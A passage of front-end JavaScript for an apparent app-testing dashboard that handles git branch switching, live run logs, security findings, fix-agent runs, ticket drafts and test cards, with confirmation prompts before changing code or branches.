state.branchSeen = b.id;\n  const chip = document.getElementById("branch");\n  chip.textContent = b.git ? `\u2387 ${b.id}${b.git.dirty ? ` \xB7 ${b.git.dirty} uncommitted` : ""} \u25BE` : "no git";\n  chip.disabled = !b.git;\n  chip.className = "branch" + (b.warnings.length ? " warn" : "");\n  chip.title = ["Branch this project is on" + (b.base ? `; verify compares with ${b.base}` : ""), ...b.warnings].join("\\n");\n  const banner = document.getElementById("banner");\n  if (b.id && state.branchSeen && b.id !== state.branchSeen) {\n    banner.innerHTML = `<div class="banner"><strong>The branch changed: ${esc(state.branchSeen)} \u2192 ${esc(b.id)}.</strong>\n      <span>Actions are paused so nothing runs on code you did not mean to test.</span>\n      <button class="btn" id="bok">Continue on ${esc(b.id)}</button></div>`;\n    document.getElementById("bok").addEventListener("click", () => { state.branchSeen = b.id; state.scan = null; banner.innerHTML = ""; checkBranch(); render(); });\n  } else if (!b.git || b.warnings.some((w) => /base branch itself|Detached/.test(w))) {\n    banner.innerHTML = `<div class="banner warn">${b.warnings.map(esc).join(" \xB7 ")}</div>`;\n  } else banner.innerHTML = "";\n}\nsetInterval(checkBranch, 5000);\n\n// Branch picker: the list loads when it opens (slow on big repos) and filters as you type.\nconst $bpop = document.getElementById("bpop"), $bq = document.getElementById("bq"), $blist = document.getElementById("blist");\n\nfunction renderBranchList() {\n  const cur = state.branchInfo?.id;\n  const words = $bq.value.trim().toLowerCase().split(/\\s+/).filter(Boolean);\n  const all = state.branchList || [];\n  const hits = all.filter((x) => words.every((w) => x.toLowerCase().includes(w))).slice(0, 200);\n  $blist.innerHTML = !state.branchList ? `<div class="none">Loading\u2026</div>`\n    : hits.length ? hits.map((x, i) => `<button data-b="${esc(x)}" class="${i === 0 && words.length ? "on" : ""} ${x === cur ? "cur" : ""}">${x === cur ? "\u2713 " : ""}${esc(x)}</button>`).join("")\n    : `<div class="none">No branch matches.</div>`;\n}\n\nasync function openBranchPicker() {\n  $bpop.hidden = false;\n  $bq.value = "";\n  renderBranchList();\n  $bq.focus();\n  const b = await api("/api/branch?branches").catch(() => null);\n  if (b) { state.branchList = b.branches; renderBranchList(); }\n}\n\nasync function switchBranch(want) {\n  $bpop.hidden = true;\n  if (!want || want === state.branchInfo?.id) return;\n  if (!confirm(`Switch this project\'s working tree to ${want}? Studio rescans afterwards.`)) return;\n  const chip = document.getElementById("branch");\n  chip.disabled = true;\n  chip.textContent = `\u2387 switching to ${want}\u2026`;\n  const res = await post("/api/branch/switch", { branch: want });\n  chip.disabled = false;\n  if (res.error) { alert(res.error); checkBranch(); return; }\n  Object.assign(state, { branchSeen: res.id, branchList: null, scan: null, verify: null, runs: null });\n  document.getElementById("banner").innerHTML = "";\n  checkBranch();\n  render();\n}\n\ndocument.getElementById("branch").addEventListener("click", (e) => { e.stopPropagation(); $bpop.hidden ? openBranchPicker() : ($bpop.hidden = true); });\n$bpop.addEventListener("click", (e) => { e.stopPropagation(); const btn = e.target.closest("button[data-b]"); if (btn) switchBranch(btn.dataset.b); });\ndocument.addEventListener("click", () => { $bpop.hidden = true; });\n$bq.addEventListener("input", renderBranchList);\n$bq.addEventListener("keydown", (e) => {\n  if (e.key === "Escape") $bpop.hidden = true;\n  if (e.key === "Enter") { const first = $blist.querySelector("button[data-b]"); if (first) switchBranch(first.dataset.b); }\n});\n\nfunction followRun(runId, el, onDone) {\n  closeStream();\n  el.innerHTML = `<h2>Run ${esc(runId)} <span class="pill running" id="rs">running</span> <button class="btn stop" id="rstop" title="Kills its build or agent; the run ends as stopped and does not count toward health">\u25A0 Stop</button></h2><div id="rr"></div><pre class="log" id="log"></pre>`;\n  const log = el.querySelector("#log");\n  const stopBtn = el.querySelector("#rstop");\n  stopBtn.addEventListener("click", async () => {\n    if (!confirm(`Stop run ${runId}?`)) return;\n    stopBtn.disabled = true; stopBtn.textContent = "Stopping\u2026";\n    const res = await stopRunReq(runId);\n    if (res.error) { alert(res.error); stopBtn.remove(); }\n  });\n  const es = new EventSource(`/api/runs/${runId}/stream`);\n  state.eventSource = es;\n  es.onmessage = (msg) => {\n    const e = JSON.parse(msg.data);\n    if (e.type === "log") {\n      const atBottom = log.scrollTop + log.clientHeight >= log.scrollHeight - 20;\n      log.textContent += e.line + "\\n";\n      if (atBottom) log.scrollTop = log.scrollHeight;\n    } else if (e.type === "done") {\n      es.close(); state.eventSource = null;\n      const rs = el.querySelector("#rs"); rs.className = "pill " + e.run.status; rs.textContent = e.run.status;\n      el.querySelector("#rstop")?.remove();\n      const rr = el.querySelector("#rr");\n      rr.innerHTML = resultsTable(e.run) + `<div id="ri"></div>`;\n      bindTicket(rr);\n      renderIssues(e.run, rr.querySelector("#ri"), el);\n      rr.querySelectorAll("a[data-open]").forEach((a) => a.addEventListener("click", (ev) => { ev.preventDefault(); state.tab === "runs" ? selectRun(a.dataset.open) : followRun(a.dataset.open, el); }));\n      // Over at once here, not at the next poll, so a re-render does not mark its button busy again.\n      state.jobs = state.jobs.filter((j) => j.runId !== e.run.id);\n      onDone && onDone(e.run);\n      showJobs();\n    }\n  };\n  es.onerror = () => { es.close(); state.eventSource = null; };\n}\n\nconst ISSUE_KIND = { test: "failing test", build: "build", card: "card failed", expectation: "not as expected", crash: "crash", perf: "performance", navigation: "navigation", security: "security" };\n\n/** Problems a run found, each with the two ways to fix it: a prompt to paste anywhere, or a fix agent here. */\nasync function renderIssues(run, el, panel) {\n  if (run.status === "running" || run.kind === "fix") return;\n  const issues = await api(`/api/runs/${encodeURIComponent(run.id)}/issues`).catch(() => []);\n  if (!Array.isArray(issues) || !issues.length) return;\n  el.innerHTML = `<div class="box issues" style="border-color:var(--fail)"><h3>${issues.length} problem${issues.length === 1 ? "" : "s"} to fix</h3>\n    ${issues.map((i) => `<div class="issue" data-issue="${esc(i.id)}">\n      <div class="what">${i.security ? securityHead(i.security) : `<span class="pill none k">${esc(ISSUE_KIND[i.kind] || i.kind)}</span> <strong>${esc(i.title)}</strong>`}<div class="muted" style="font-size:12px">${esc(i.feature)}${i.cardId ? ` / ${esc(i.cardId)}` : ""}${i.runId !== run.id ? ` \xB7 run ${esc(i.runId)}` : ""}</div>${i.security ? securityBody(i.security) : ""}</div>\n      ${i.security ? `<button class="btn secondary" data-dismiss title="Not a problem here: hide it from later runs, with the reason">Dismiss</button>` : ""}\n      <button class="btn secondary" data-prompt title="A prompt with the problem, its evidence and the code to look at, for any coding agent">\u29C9 Fix prompt</button>\n      <button class="btn" data-fix title="An agent edits the code to fix it, then Probe runs the unit tests and the card again. Nothing is committed.">\u2726 Fix</button>\n      <div class="ip" style="flex:1 1 100%"></div></div>`).join("")}</div>`;\n  el.querySelectorAll(".issue").forEach((row) => {\n    const id = row.dataset.issue;\n    const out = row.querySelector(".ip");\n    row.querySelector("[data-prompt]").addEventListener("click", async () => {\n      if (out.innerHTML) { out.innerHTML = ""; return; }\n      const r = await api(`/api/issues/${encodeURIComponent(id)}/prompt`);\n      out.innerHTML = `<textarea class="prompt" readonly>${esc(r.prompt)}</textarea><div class="row"><button class="btn secondary" data-copy>Copy</button><span class="muted" data-copied></span></div>`;\n      out.querySelector("[data-copy]").addEventListener("click", async () => {\n        const ta = out.querySelector("textarea");\n        try { await navigator.clipboard.writeText(ta.value); } catch { ta.select(); document.execCommand("copy"); }\n        out.querySelector("[data-copied]").textContent = "Copied.";\n      });\n    });\n    row.querySelector("[data-dismiss]")?.addEventListener("click", async () => {\n      const reason = prompt(`Why is this not an issue here?\\n\\n${row.querySelector("strong").textContent}`);\n      if (!reason || !reason.trim()) return;\n      const res = await post(`/api/issues/${encodeURIComponent(id)}/dismiss`, { reason });\n      if (res.error) return alert(res.error);\n      row.remove();\n    });\n    row.querySelector("[data-fix]").addEventListener("click", async () => {\n      const branch = state.branchSeen ? ` on ${state.branchSeen}` : "";\n      if (!confirm(`An agent will change the code${branch} to fix:\\n\\n${row.querySelector("strong").textContent}\\n\\nThen Probe runs the unit tests (and the card again). Nothing is committed: you review the changes. Start?`)) return;\n      const res = await post(`/api/issues/${encodeURIComponent(id)}/fix`);\n      if (res.error) return alert(res.error);\n      followRun(res.runId, panel);\n    });\n  });\n}\n\nfunction securityHead(f) {\n  return `<span class="pill sev-${esc(f.severity)}">${esc(f.severity)}</span> <span class="pill none mono" title="${esc(f.refs.join(", "))}">${esc(f.check)}</span> <strong>${esc(f.title)}</strong>`;\n}\n\nfunction securityBody(f) {\n  return `<div style="font-size:12px;margin-top:4px">${f.file ? `<span class="mono">${esc(f.file)}${f.line ? `:${f.line}` : ""}</span> \xB7 ` : ""}<span class="muted">${esc(f.layer)}</span></div>\n    ${f.evidence ? `<pre class="mono" style="font-size:12px;white-space:pre-wrap;margin:4px 0;background:var(--track);padding:6px;border-radius:6px">${esc(f.evidence)}</pre>` : ""}\n    <details style="font-size:13px"><summary class="muted">Why and how to fix</summary><p>${esc(f.why)}</p><p><strong>Fix:</strong> ${esc(f.fix)}</p></details>`;\n}\n\nconst stopRunReq = (id) => post(`/api/runs/${encodeURIComponent(id)}/stop`);\n\nfunction perfBlock(p) {\n  if (!p) return "";\n  const cell = (k, v) => `<div class="card"><div class="k">${k}</div><div class="v" style="font-size:17px">${v}</div></div>`;\n  return `<div class="cards" style="margin:8px 0">${p.startupMs !== undefined ? cell("Cold start", p.startupMs + " ms") : ""}${cell("Frames", p.frames)}${cell("Janky", p.jankyPct + "%")}${cell("p50 / p90 / p99", `${p.p50Ms} / ${p.p90Ms} / ${p.p99Ms} ms`)}${p.memoryMb ? cell("Memory", p.memoryMb + " MB") : ""}</div>` +\n    p.issues.map((i) => `<p style="color:var(--warn)">\u26A0 ${esc(i)}</p>`).join("");\n}\n\nfunction evidence(run) {\n  const file = (name) => `/api/runs/${encodeURIComponent(run.id)}/files/${name}`;\n  const shots = run.timeline.filter((t) => t.screenshot);\n  return `<p>${esc(run.device)} \xB7 ${run.timeline.length} steps \xB7 $${run.costUsd.toFixed(2)}</p>` + perfBlock(run.perf) +\n    run.crashes.map((c) => `<pre class="log" style="color:var(--fail)">${esc(c)}</pre>`).join("") +\n    (run.video ? `<video controls preload="metadata" src="${file(run.video)}" style="max-height:420px;max-width:100%;border-radius:10px;margin:8px 0"></video>` : "") +\n    (shots.length ? `<div class="shots">${shots.map((t, i) => `<figure><a href="${file(t.screenshot)}" target="_blank"><img loading="lazy" src="${file(t.screenshot)}" alt="step ${i + 1}"></a><figcaption>${esc(t.action)} \xB7 ${esc(t.detail).slice(0, 80)}</figcaption></figure>`).join("")}</div>` : "") +\n    `<details style="margin-top:8px"><summary class="muted">All ${run.timeline.length} steps</summary><ol class="mono">${run.timeline.map((t) => `<li>${esc(t.action)} \u2014 ${esc(t.detail)}</li>`).join("")}</ol></details>`;\n}\n\nfunction ticketButton(run) {\n  if (run.status === "passed" || run.status === "running" || run.status === "stopped" || run.kind === "backfill" || run.kind === "login" || run.kind === "init") return "";\n  return `<div class="row" style="margin:10px 0"><button class="btn secondary" data-ticket="${esc(run.id)}">\u29C9 Ticket draft</button></div><div class="ticketpanel"></div>`;\n}\n\nasync function bindTicket(el) {\n  const b = el.querySelector("button[data-ticket]");\n  if (!b) return;\n  b.addEventListener("click", async () => {\n    const [d, cfg] = await Promise.all([api(`/api/runs/${encodeURIComponent(b.dataset.ticket)}/ticket`), api("/api/tickets/config")]);\n    const panel = el.querySelector(".ticketpanel");\n    panel.innerHTML = `<div class="box"><h3>${esc(d.title)}</h3><textarea class="mono" readonly style="min-height:220px">${esc(d.body)}</textarea>\n      <div class="row" style="margin-top:8px"><button class="btn secondary" data-copy>Copy</button>${cfg.canFile ? `<button class="btn" data-file>File ticket</button>` : `<span class="muted">Set tickets.fileCommand in probe.yaml to file from here.</span>`}<span class="muted" data-out></span></div></div>`;\n    panel.querySelector("[data-copy]").addEventListener("click", () => navigator.clipboard.writeText(`${d.title}\\n\\n${d.body}`).then(() => (panel.querySelector("[data-out]").textContent = "Copied.")));\n    const file = panel.querySelector("[data-file]");\n    if (file) file.addEventListener("click", async () => {\n      if (!confirm(`File "${d.title}" with the configured ticket command?`)) return;\n      file.disabled = true;\n      const res = await post(`/api/runs/${encodeURIComponent(b.dataset.ticket)}/ticket/file`);\n      panel.querySelector("[data-out]").textContent = res.error ? res.error : `Filed: ${res.output}`;\n    });\n  });\n}\n\nfunction resultsTable(run) {\n  const err = run.error ? `<p style="color:var(--fail)">${esc(run.error)}</p>` : "";\n  if (run.kind === "verify") {\n    const link = (id, label) => id ? `<a href="#" data-open="${esc(id)}">${esc(label)}</a>` : esc(label);\n    return err + `<p>vs <strong>${esc(run.base)}</strong> \xB7 ${run.changed.length} changed files \xB7 ${run.features.length} features \xB7 ${run.device ? "unit + device" : "unit only"} \xB7 $${run.costUsd.toFixed(2)}</p>\n      <table style="margin:8px 0"><thead><tr><th>Feature</th><th>Unit</th><th>Cards on device</th></tr></thead><tbody>\n      ${run.features.map((f) => `<tr><td><strong>${esc(f.feature)}</strong><br><span class="muted">${f.files.length} files</span></td>\n        <td>${f.unitStatus ? `<span class="pill ${f.unitStatus}">${link(f.unitRun, f.unitStatus)}</span>` : "\u2014"}</td>\n        <td>${f.cards.map((c) => `<div><span class="pill ${c.status}">${c.status}</span> ${link(c.runId, c.cardId)}${c.note ? ` <span class="muted">\u2014 ${esc(c.note)}</span>` : ""}</div>`).join("") || "\u2014"}</td></tr>`).join("")}\n      </tbody></table>\n      ${run.unowned.length ? `<details><summary class="muted">${run.unowned.length} changed files outside any module</summary><p class="mono muted">${run.unowned.map(esc).join("<br>")}</p></details>` : ""}` + ticketButton(run);\n  }\n  if (run.kind === "init") {\n    return err + `<p>${run.drafts.length ? `${run.drafts.length} drafts to review below` : "no new drafts"}${run.costUsd ? ` \xB7 ${run.costUsd.toFixed(2)}` : ""}</p>`;\n  }\n  if (run.kind === "login") {\n    const l = run.login;\n    return err + (l ? `<p><strong>${l.state === "logged_in" ? (l.role ? `Logged in as ${esc(l.role)}` : "Logged in with a NON-test account") : l.state === "logged_out" ? "Logged out" : "Unknown"}</strong>${l.seenAs ? ` \xB7 shows ${esc(l.seenAs)}` : ""}</p>${l.notes ? `<p class="muted">${esc(l.notes)}</p>` : ""}` : "") + evidence(run);\n  }\n  if (run.kind === "explore") {\n    return err + `${run.issues.length ? `<div class="box" style="border-color:var(--fail)"><h3>Issues</h3><ul>${run.issues.map((i) => `<li>${esc(i)}</li>`).join("")}</ul></div>` : ""}\n      <table style="margin:8px 0"><thead><tr><th>Screen</th><th>Reach</th></tr></thead><tbody>${run.screens.map((sc) => `<tr><td>${esc(sc.name)}</td><td>${sc.reach.map(esc).join(" \u2192 ")}</td></tr>`).join("")}</tbody></table>` + evidence(run) + ticketButton(run);\n  }\n  if (run.kind === "unitwrite") {\n    return err + `<p>Targets: ${run.targets.map(esc).join(", ")} \xB7 $${run.costUsd.toFixed(2)}${run.unitRun ? ` \xB7 <a href="#" data-open="${esc(run.unitRun)}">unit run</a>` : ""}</p>\n      <ul class="mono">${run.files.map((f) => `<li style="${run.outsideTests.includes(f) ? "color:var(--warn)" : ""}">${run.outsideTests.includes(f) ? "\u26A0 " : "+ "}${esc(f)}</li>`).join("")}</ul>\n      <p class="muted">Nothing is committed: review the files in your working tree.</p>`;\n  }\n  if (run.kind === "card") {\n    const v = run.verdict;\n    const exp = v ? `<table style="margin:8px 0"><tbody>${v.expectations.map((e) => `<tr><td>${e.met === true ? "\u2705" : e.met === false ? "\u274C" : "\u2754"}</td><td>${esc(e.text)}<br><span class="muted">${esc(e.evidence)}</span></td></tr>`).join("")}</tbody></table>` : "";\n    return err + `<p class="muted">${esc(run.feature)} / ${esc(run.cardId)}${run.parent ? ` \xB7 part of <a href="#" data-open="${esc(run.parent)}">verify ${esc(run.parent)}</a>` : ""}</p>` + (v?.notes ? `<p>${esc(v.notes)}</p>` : "") + exp + evidence(run) + ticketButton(run);\n  }\n  if (run.kind === "security") {\n    const sev = ["critical", "high", "medium", "low", "info"].map((s) => [s, run.findings.filter((f) => f.severity === s).length]).filter(([, n]) => n);\n    return (run.status === "error" ? err : "") + `<p>${run.feature === "*" ? "Whole project" : esc(run.feature)} \xB7 ${run.files} files \xB7 platforms: ${run.platforms.map(esc).join(", ") || "\u2014"}${run.costUsd ? ` \xB7 $${run.costUsd.toFixed(2)}` : ""}</p>\n      <p>${sev.map(([s, n]) => `<span class="pill sev-${s}">${n} ${s}</span>`).join(" ") || `<span class="pill passed">no open findings</span>`}${run.dismissed ? ` <span class="muted">\xB7 ${run.dismissed} dismissed</span>` : ""}</p>\n      <table style="margin:8px 0"><thead><tr><th>Layer</th><th>Status</th><th>Note</th></tr></thead><tbody>${run.layers.map((l) => `<tr><td>${esc(l.layer)}</td><td><span class="pill ${l.status === "ran" ? "passed" : l.status === "error" ? "error" : "skipped"}">${esc(l.status)}</span></td><td class="muted">${esc(l.note || "")}</td></tr>`).join("")}</tbody></table>`;\n  }\n  if (run.kind === "fix") {\n    const link = (id, label) => id ? ` \xB7 <a href="#" data-open="${esc(id)}">${label}</a>` : "";\n    return err + `<p><strong>${esc(run.issue.title)}</strong></p>\n      <p class="muted">${esc(run.feature)} \xB7 $${run.costUsd.toFixed(2)}${link(run.issue.runId, "where it was found")}${link(run.unitRun, "unit run")}${link(run.recheckRun, "device recheck")}</p>\n      ${run.securityRecheck ? `<p>${run.securityRecheck.stillFound ? `<span class="pill failed">still found</span>` : `<span class="pill passed">check passes</span>`} <span class="muted">${esc(run.securityRecheck.note)}</span></p>` : ""}\n      ${run.files.length ? `<ul class="mono">${run.files.map((f) => `<li>~ ${esc(f)}</li>`).join("")}</ul><p class="muted">Nothing is committed: review the changes in your working tree.</p>` : ""}\n      ${run.summary ? `<details open><summary class="muted">Agent\'s account</summary><pre class="log" style="background:var(--track);color:var(--text)">${esc(run.summary)}</pre></details>` : ""}`;\n  }\n  if (run.kind === "check") {\n    const link = (id, label) => id ? `<a href="#" data-open="${esc(id)}">${esc(label)}</a>` : esc(label);\n    const features = run.features || [];\n    return err + `<p class="muted">After ${esc(TRIGGER[run.trigger] || run.trigger)} edits \xB7 ${features.length} feature${features.length === 1 ? "" : "s"} checked</p>\n      ${features.length ? `<table style="margin:8px 0"><thead><tr><th>Feature</th><th>Unit</th><th>Manifest</th></tr></thead><tbody>\n      ${features.map((f) => `<tr><td><strong>${esc(f.feature)}</strong>${f.owned ? "" : `<br><span class="muted">depends on the change</span>`}${f.note ? `<br><span class="muted">${esc(f.note)}</span>` : ""}</td>\n        <td>${f.unitStatus ? `<span class="pill ${f.unitStatus}">${link(f.unitRun, f.unitStatus)}</span>` : "\u2014"}\n          ${(f.failures || []).map((x) => `<div class="mono" style="color:var(--fail);font-size:12px;margin-top:4px">\u2717 ${esc(x)}</div>`).join("")}\n          ${(f.deviceRules || []).length ? `<div class="muted" style="font-size:12px;margin-top:4px">Only a device proves: ${f.deviceRules.map(esc).join(", ")}</div>` : ""}</td>\n        <td>${f.manifest ? `${f.manifest.links} links${f.manifest.broken ? ` \xB7 <strong style="color:var(--fail)">${f.manifest.broken} broken</strong>` : ""}${f.manifest.gaps ? ` \xB7 ${f.manifest.gaps} unproven` : ""}` : "\u2014"}\n          ${f.draftId ? `<div style="font-size:12px;margin-top:4px">\u270E correction drafted \xB7 <a href="#setup">review in Setup</a></div>` : ""}</td></tr>`).join("")}\n      </tbody></table>` : `<p>Nothing was stale.</p>`}\n      ${(run.skipped || []).length ? `<details><summary class="muted">${run.skipped.length} left for a later check</summary><p class="mono muted">${run.skipped.map(esc).join(", ")}</p></details>` : ""}`;\n  }\n  if (run.kind === "backfill") {\n    return err + `<p>${run.written.length} cards written \xB7 $${run.costUsd.toFixed(2)}</p>` +\n      (run.written.length ? `<p class="mono muted">${run.written.map(esc).join(" \xB7 ")}</p>` : "");\n  }\n  // Unit runs, and anything this page does not know yet: never let a missing field blank the panel.\n  const results = run.results || [];\n  if (!results.length) return err;\n  return err + ticketButton(run) + `<table style="margin-bottom:12px"><thead><tr><th>Module</th><th class="num">Tests</th><th class="num">Failed</th><th class="num">Skipped</th><th class="num">Time</th></tr></thead><tbody>\n    ${results.map((r) => `<tr><td class="mono">${esc(r.module)}${r.cached ? ` <span class="pill none" title="Code unchanged since the last build; results reused">cached</span>` : ""}</td><td class="num">${r.tests}</td><td class="num" style="${r.failed ? "color:var(--fail);font-weight:700" : ""}">${r.failed}</td><td class="num">${r.skipped}</td><td class="num">${(r.durationMs / 1000).toFixed(1)}s</td></tr>\n      ${r.failures.map((x) => `<tr><td colspan="5" class="mono" style="color:var(--fail)">\u2717 ${esc(x.className)}.${esc(x.name)}<br><span class="muted">${esc(x.message || "")}</span></td></tr>`).join("")}`).join("")}\n  </tbody></table>`;\n}\n\nconst LEVEL_LABEL = { feature: "overview", capability: "flow", regression: "regression" };\n\nfunction cardHtml(c) {\n  const list = (items) => items.map((x) => `<li>${esc(x)}</li>`).join("");\n  return `<details class="fc" data-feature="${esc(c.feature)}" data-id="${esc(c.id)}">\n    <summary>\n      <span class="pill lvl-${c.level}">${LEVEL_LABEL[c.level]}</span>\n      <strong>${esc(c.title)}</strong>\n      ${c.tickets.map((t) => `<span class="mono muted">${esc(t)}</span>`).join(" ")}\n      <span style="flex:1"></span>\n      ${lastRunPill(c.lastRun)}\n      <span class="pill conf-${c.confidence}" title="confidence">${c.confidence}</span>\n      <span class="pill st-${c.status}">${c.status}</span>\n    </summary>\n    <div class="fc-body">\n      <p>${esc(c.summary)}</p>\n      <div class="reach">${c.reach.map((r) => `<span>${esc(r)}</span>`).join("<b>\u2192</b>")}</div>\n      ${c.preconditions.length ? `<div class="k">Given</div><ul>${list(c.preconditions)}</ul>` : ""}\n      <div class="k">Steps</div><ol>${list(c.steps)}</ol>\n      <div class="k">Expect</div><ul class="expect">${c.expect.map((e) => `<li><span class="pill none">${e.check}</span> ${esc(e.text)}</li>`).join("")}</ul>\n      <div class="k">Sources</div><ul class="mono muted">${c.sources.map((s) => `<li>${s.type}: ${esc(s.ref)}${s.note ? ` \u2014 ${esc(s.note)}` : ""}</li>`).join("")}</ul>\n      <div class="muted" style="font-size:12px">${c.accounts} test account${c.accounts === 1 ? "" : "s"} \xB7 ${esc(c.modules.join(", "))} \xB7 ${c.createdBy}, ${ago(c.updatedAt)}</div>\n      <div class="row" style="margin-top:10px">\n        <button class="btn" data-run data-job="${esc(jobKey.card(c.feature, c.id))}" data-busy="Agent testing\u2026" ${noDevices() ? `disabled title="${esc(noDevices())}"` : `title="An agent performs this card on an emulator and checks every expectation"`}>\u25B6 Run on device</button>\n        ${c.status !== "approved" ? `<button class="btn secondary" data-status="approved">Approve</button>` : ""}\n        ${c.status !== "rejected" ? `<button class="btn secondary" data-status="rejected">Reject</button>` : ""}\n        ${c.status !== "draft" ? `<button class="btn secondary" data-status="draft">Back to draft</button>` : ""}\n      </div>\n    </div>\n  </details>`;\n}\n\nfunction bindCardActions(el, refresh) {\n  el.querySelectorAll("details.fc").forEach((d) => d.querySelectorAll("button[data-run]").forEach((b) => b.addEventListener("click", async () => {\n    b.disabled = true; b.textContent = "Agent testing\u2026";\n    const res = await api(`/api/cards/${encodeURIComponent(d.dataset.feature)}/${encodeURIComponent(d.dataset.id)}/run`, { method: "POST" });\n    if (res.error) { alert(res.error); b.disabled = false; b.textContent = "\u25B6 Run on device"; return; }\n    let panel = d.querySelector(".runpanel");\n    if (!panel) { panel = document.createElement("div"); panel.className = "runpanel"; d.querySelector(".fc-body").appendChild(panel); }\n    followRun(res.runId, panel, () => { b.disabled = false; b.textContent = "\u25B6 Run on device"; });\n  })));\n  el.querySelectorAll("details.fc").forEach((d) => d.querySelectorAll("button[data-status]").forEach((b) => b.addEventListener("click", async () => {\n    await api(`/api/cards/${encodeURIComponent(d.dataset.feature)}/${encodeURIComponent(d.dataset.id)}/status`, {\n      method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ status: b.dataset.status }),\n    });\n    state.scan = null;\n    refresh();\n  })));\n}\n\nconst LEVEL_TABS = [["all", "All"], ["feature", "Overview"], ["capability", "Flows"], ["regression", "Regressions"]];\nconst SIDE_FILTERS = [["all", "All"], ["draft", "To review"], ["failing", "Failing"], ["outdated", "Outdated"], ["notrun", "Never run"]];\n\n/** One entry per feature: its counts, and the dot that says what needs attention first. */\nfunction cardFeatures(all) {\n  const by = new Map();\n  for (const c of all) {\n    const f = by.get(c.feature) || { id: c.feature, cards: [], draft: 0, approved: 0, failing: 0, notrun: 0, outdated: 0 };\n    f.cards.push(c);\n    if (c.status === "draft") f.draft++;\n    if (c.status === "approved") f.approved++;\n    if (c.lastRun && ["failed", "error"].includes(c.lastRun.status) && c.lastRun.fresh !== "stale") f.failing++;\n    if (c.lastRun && (c.lastRun.fresh === "stale" || c.lastRun.fresh === "maybe") && c.status !== "rejected") f.outdated++;\n    if (!c.lastRun && c.status !== "rejected") f.notrun++;\n    by.set(c.feature, f);\n  }\n  return [...by.values()].sort((a, b) => a.id.localeCompare(b.id));\n}\n\nasync function renderCards() {\n  if (!state.cardFilter) state.cardFilter = { side: "all", q: "", level: "all", status: "all", feature: null };\n  const fl = state.cardFilter;\n  const all = await api("/api/cards");\n  if (!all.length) {\n    $view.innerHTML = `<div class="empty">No cards yet. Open a feature in Atlas and choose \u2726 Draft cards, or <button class="btn secondary" id="bfall" data-job="${esc(jobKey.backfill("*"))}" data-busy="Agents drafting\u2026">\u2726 Draft cards for every feature</button></div><div id="runpanel"></div>`;\n    return bindBackfillAll();\n  }\n  const features = cardFeatures(all);\n  const listed = features\n    .filter((f) => !fl.q || (f.id + " " + f.cards.map((c) => c.title + " " + c.tickets.join(" ")).join(" ")).toLowerCase().includes(fl.q.toLowerCase()))\n    .filter((f) => fl.side === "all" || f[fl.side] > 0);\n  // Open on what needs a person: a failing feature, else one with drafts.\n  if (!fl.feature || !features.some((f) => f.id === fl.feature)) fl.feature = (features.find((f) => f.failing) || features.find((f) => f.draft) || features[0]).id;\n  saveRoute();\n  const f = features.find((x) => x.id === fl.feature);\n  const cards = f.cards.filter((c) => (fl.level === "all" || c.level === fl.level) && (fl.status === "all" || c.status === fl.status));\n  const total = (k) => features.reduce((n, x) => n + x[k], 0);\n  const dot = (x) => (x.failing ? "fail" : x.draft || x.outdated ? "draft" : x.approved ? "ok" : "");\n\n  $view.innerHTML = `\n    <div class="toolbar">\n      <span><strong>${all.length}</strong> cards in <strong>${features.length}</strong> features</span>\n      <span class="pill st-draft">${total("draft")} to review</span>\n      <span class="pill st-approved">${total("approved")} approved</span>\n      ${total("failing") ? `<span class="pill failed">${total("failing")} failing</span>` : ""}\n      <div style="flex:1"></div>\n      <button class="btn secondary" id="bfall" data-job="${esc(jobKey.backfill("*"))}" data-busy="Agents drafting\u2026" title="Runs a background agent per feature that has no cards yet">\u2726 Draft cards for features without any</button>\n    </div>\n    <div id="runpanel"></div>\n    <div class="split">\n      <aside class="side">\n        <div class="head">\n          <input type="search" id="cq" placeholder="Find a feature, card or ticket\u2026" value="${esc(fl.q)}">\n          <div class="chips">${SIDE_FILTERS.map(([k, label]) => `<button class="chip ${fl.side === k ? "active" : ""}" data-side="${k}">${label}${k === "all" ? "" : ` ${total(k)}`}</button>`).join("")}</div>\n        </div>\n        <ul>${listed.map((x) => `<li data-f="${esc(x.id)}" class="${x.id === f.id ? "active" : ""}" title="${x.draft} to review \xB7 ${x.approved} approved \xB7 ${x.failing} failing \xB7 ${x.notrun} never run">\n          <span class="d ${dot(x)}"></span><span class="name">${esc(x.id)}</span><span class="n">${x.draft ? `${x.draft}/` : ""}${x.cards.length}</span></li>`).join("") || `<li class="muted">No feature matches.</li>`}</ul>\n      </aside>\n      <section>\n        <div class="toolbar">\n          <h2 style="margin:0">${esc(f.id)}</h2>\n          <span class="muted">${f.cards.length} cards \xB7 ${f.approved} approved \xB7 ${f.draft} to review${f.failing ? ` \xB7 <span style="color:var(--fail)">${f.failing} failing</span>` : ""}${f.outdated ? ` \xB7 <span style="color:var(--warn)">${f.outdated} outdated</span>` : ""}</span>\n          <div style="flex:1"></div>\n          ${f.outdated || f.notrun ? `<button class="btn secondary" id="rerunold" data-job="${esc(jobKey.verifyOutdated([f.id]))}" data-busy="Re-running\u2026" title="Runs this feature\'s approved cards whose result is outdated or missing">\u27F3 Re-run ${f.outdated + f.notrun} outdated / never run</button>` : ""}\n          ${f.draft ? `<button class="btn secondary" id="approveall" title="Approve every draft card of ${esc(f.id)}">Approve all ${f.draft} drafts</button>` : ""}\n        </div>\n        <div class="toolbar">\n          <div class="seg" id="clv">${LEVEL_TABS.map(([k, label]) => `<button data-l="${k}" class="${fl.level === k ? "active" : ""}">${label} <span class="muted">${k === "all" ? f.cards.length : f.cards.filter((c) => c.level === k).length}</span></button>`).join("")}</div>\n          <div class="seg" id="cst">${["all", "draft", "approved", "rejected"].map((k) => `<button data-s="${k}" class="${fl.status === k ? "active" : ""}">${k}</button>`).join("")}</div>\n        </div>\n        <div id="cardlist">${cards.length ? cards.map(cardHtml).join("") : `<div class="empty">No cards here with these filters.</div>`}</div>\n      </section>\n    </div>`;\n\n  bindCardActions(document.getElementById("cardlist"), renderCards);\n  const q = document.getElementById("cq");\n  q.addEventListener("input", () => {\n    const v = q.value.toLowerCase();\n    // Filter the sidebar in place, so typing never loses focus.\n    $view.querySelectorAll(".side li[data-f]").forEach((li) => {\n      const x = features.find((y) => y.id === li.dataset.f);\n      li.style.display = !v || (x.id + " " + x.cards.map((c) => c.title + " " + c.tickets.join(" ")).join(" ")).toLowerCase().includes(v) ? "" : "none";\n    });\n  });\n  q.addEventListener("change", () => { fl.q = q.value; });\n  $view.querySelectorAll(".side li[data-f]").forEach((li) => li.addEventListener("click", () => { fl.feature = li.dataset.f; fl.level = "all"; render(); }));\n  